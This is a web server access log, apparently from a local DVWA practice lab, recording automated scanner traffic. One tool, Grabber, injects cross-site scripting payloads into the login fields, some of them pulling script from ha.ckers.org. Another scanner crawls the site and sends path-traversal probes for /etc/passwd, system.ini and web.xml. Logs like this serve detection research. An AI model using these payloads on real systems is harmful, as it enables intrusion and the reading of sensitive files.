172.17.0.1 - - [12/Feb/2019:08:22:03 +0000] "GET /?username=%3CLAYER+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fscriptlet.html%22%3E%3C%2FLAYER%3E&user_token=%3CLAYER+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fscriptlet.html%22%3E%3C%2FLAYER%3E&Login=%3CLAYER+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fscriptlet.html%22%3E%3C%2FLAYER%3E&password=%3CLAYER+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fscriptlet.html%22%3E%3C%2FLAYER%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:03 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:03 +0000] "GET /?username=%3CIMG+SRC%3D%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2339%3B%26%2388%3B%26%2383%3B%26%2383%3B%26%2339%3B%26%2341%3B%3E&user_token=%3CIMG+SRC%3D%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2339%3B%26%2388%3B%26%2383%3B%26%2383%3B%26%2339%3B%26%2341%3B%3E&Login=%3CIMG+SRC%3D%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2339%3B%26%2388%3B%26%2383%3B%26%2383%3B%26%2339%3B%26%2341%3B%3E&password=%3CIMG+SRC%3D%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2339%3B%26%2388%3B%26%2383%3B%26%2383%3B%26%2339%3B%26%2341%3B%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:03 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:04 +0000] "GET /?username=%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E&user_token=%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E&Login=%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E&password=%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:04 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:04 +0000] "GET /?username=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Ddata%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K%22%3E&user_token=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Ddata%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K%22%3E&Login=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Ddata%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K%22%3E&password=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Ddata%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K%22%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:04 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:04 +0000] "GET /?username=%3CA+HREF%3D%22http%3A%2F%2F0102.0146.0007.00000223%2F%22%3EXSS%3C%2FA%3E&user_token=%3CA+HREF%3D%22http%3A%2F%2F0102.0146.0007.00000223%2F%22%3EXSS%3C%2FA%3E&Login=%3CA+HREF%3D%22http%3A%2F%2F0102.0146.0007.00000223%2F%22%3EXSS%3C%2FA%3E&password=%3CA+HREF%3D%22http%3A%2F%2F0102.0146.0007.00000223%2F%22%3EXSS%3C%2FA%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:04 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:04 +0000] "GET /?username=%3CIMG+SRC%3D%22mocha%3A%5Bcode%5D%22%3E&user_token=%3CIMG+SRC%3D%22mocha%3A%5Bcode%5D%22%3E&Login=%3CIMG+SRC%3D%22mocha%3A%5Bcode%5D%22%3E&password=%3CIMG+SRC%3D%22mocha%3A%5Bcode%5D%22%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:04 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:04 +0000] "GET /?username=%3CIMG+SRC%3Djavascript%3Aalert%28%26quot%3BXSS%26quot%3B%29%3E&user_token=%3CIMG+SRC%3Djavascript%3Aalert%28%26quot%3BXSS%26quot%3B%29%3E&Login=%3CIMG+SRC%3Djavascript%3Aalert%28%26quot%3BXSS%26quot%3B%29%3E&password=%3CIMG+SRC%3Djavascript%3Aalert%28%26quot%3BXSS%26quot%3B%29%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:04 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:04 +0000] "GET /?username=%3CA+HREF%3D%22http%3A%2F%2F%2577%2577%2577%252E%2567%256F%256F%2567%256C%2565%252E%2563%256F%256D%22%3EXSS%3C%2FA%3E&user_token=%3CA+HREF%3D%22http%3A%2F%2F%2577%2577%2577%252E%2567%256F%256F%2567%256C%2565%252E%2563%256F%256D%22%3EXSS%3C%2FA%3E&Login=%3CA+HREF%3D%22http%3A%2F%2F%2577%2577%2577%252E%2567%256F%256F%2567%256C%2565%252E%2563%256F%256D%22%3EXSS%3C%2FA%3E&password=%3CA+HREF%3D%22http%3A%2F%2F%2577%2577%2577%252E%2567%256F%256F%2567%256C%2565%252E%2563%256F%256D%22%3EXSS%3C%2FA%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:04 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:04 +0000] "GET /?username=%3CSTYLE+type%3D%22text%2Fcss%22%3EBODY%7Bbackground%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%7D%3C%2FSTYLE%3E&user_token=%3CSTYLE+type%3D%22text%2Fcss%22%3EBODY%7Bbackground%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%7D%3C%2FSTYLE%3E&Login=%3CSTYLE+type%3D%22text%2Fcss%22%3EBODY%7Bbackground%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%7D%3C%2FSTYLE%3E&password=%3CSTYLE+type%3D%22text%2Fcss%22%3EBODY%7Bbackground%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%7D%3C%2FSTYLE%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:04 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:55:05 +0000] "GET / HTTP/1.1" 302 423 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0;)"
172.17.0.1 - - [12/Feb/2019:08:55:05 +0000] "GET /login.php HTTP/1.1" 200 1937 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0;)"
172.17.0.1 - - [12/Feb/2019:08:55:06 +0000] "GET / HTTP/1.1" 302 423 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:06 +0000] "GET /robots.txt HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:06 +0000] "GET /sitemap.xml HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:06 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:06 +0000] "GET / HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:06 +0000] "GET /dvwa/css/login.css HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:06 +0000] "GET /dvwa/images/login_logo.png HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:06 +0000] "GET /dvwa/images/RandomStorm.png HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:06 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:06 +0000] "GET /setup.php HTTP/1.1" 200 4457 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:06 +0000] "GET /instructions.php HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:06 +0000] "GET /about.php HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:06 +0000] "GET /favicon.ico HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:06 +0000] "GET /dvwa/css/main.css HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:06 +0000] "GET /dvwa/js/dvwaPage.js HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:06 +0000] "GET /dvwa/js/add_event_listeners.js HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:06 +0000] "GET /dvwa/images/logo.png HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:06 +0000] "GET /dvwa/images/spanner.png HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:06 +0000] "GET /instructions.php?doc=readme HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:06 +0000] "GET /instructions.php?doc=PDF HTTP/1.1" 200 2279 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:06 +0000] "GET /instructions.php?doc=changelog HTTP/1.1" 200 10558 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:06 +0000] "GET /instructions.php?doc=copying HTTP/1.1" 200 39072 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:06 +0000] "POST /setup.php HTTP/1.1" 302 282 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:06 +0000] "GET /instructions.php?doc=PHPIDS-license HTTP/1.1" 200 11463 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:06 +0000] "GET /docs/DVWA_v1.3.pdf HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /1708583353601424806.php HTTP/1.1" 404 459 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /docs/8781947103417695382 HTTP/1.1" 404 460 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /dvwa/5350916429046160340 HTTP/1.1" 404 460 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /dvwa/css/7732657546946765421 HTTP/1.1" 404 464 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /dvwa/images/2320526087261685941 HTTP/1.1" 404 467 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /dvwa/js/5588204999373046981 HTTP/1.1" 404 463 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /docs HTTP/1.1" 301 520 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /?query=c%3A%2FWindows%2Fsystem.ini HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /about.php?query=c%3A%2FWindows%2Fsystem.ini HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /about.php?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /about.php?query=c%3A%5CWindows%5Csystem.ini HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /?query=c%3A%5CWindows%5Csystem.ini HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /about.php?query=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /?query=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /about.php?query=%2Fetc%2Fpasswd HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /?query=%2Fetc%2Fpasswd HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /about.php?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /about.php?query=c%3A%2F HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /about.php?query=%2F HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /?query=c%3A%2F HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /about.php?query=c%3A%5C HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /?query=%2F HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /about.php?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /about.php?query=WEB-INF%2Fweb.xml HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /?query=c%3A%5C HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /about.php?query=WEB-INF%5Cweb.xml HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /about.php?query=%2FWEB-INF%2Fweb.xml HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /about.php?query=%5CWEB-INF%5Cweb.xml HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /?query=WEB-INF%2Fweb.xml HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /about.php?query=thishouldnotexistandhopefullyitwillnot HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /?query=WEB-INF%5Cweb.xml HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
